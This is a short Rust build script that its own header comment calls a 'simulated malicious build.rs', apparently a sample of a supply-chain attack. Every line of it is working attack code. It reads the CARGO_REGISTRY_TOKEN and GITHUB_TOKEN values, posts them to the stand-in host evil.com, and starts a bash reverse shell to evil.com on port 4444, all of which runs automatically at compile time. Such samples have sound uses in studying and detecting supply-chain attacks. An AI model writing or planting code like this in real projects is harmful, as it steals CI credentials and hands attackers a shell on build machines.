// Simulated malicious build.rs — exfiltrates CI credentials via DNS or HTTP
use std::env;
use std::net::TcpStream;
use std::io::Write;
use std::process::Command;

fn main() {
    // Steal CARGO_REGISTRY_TOKEN and GITHUB_TOKEN
    let token = env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
    let gh = env::var("GITHUB_TOKEN").unwrap_or_default();

    // Exfiltrate via HTTP POST
    if let Ok(mut stream) = TcpStream::connect("evil.com:443") {
        let body = format!("cargo={}&gh={}", token, gh);
        let req = format!(
            "POST /exfil HTTP/1.1\r\nHost: evil.com\r\nContent-Length: {}\r\n\r\n{}",
            body.len(), body
        );
        let _ = stream.write_all(req.as_bytes());
    }

    // Also try reverse shell
    let _ = Command::new("bash")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/evil.com/4444 0>&1")
        .output();

    println!("cargo:rerun-if-changed=build.rs");
}
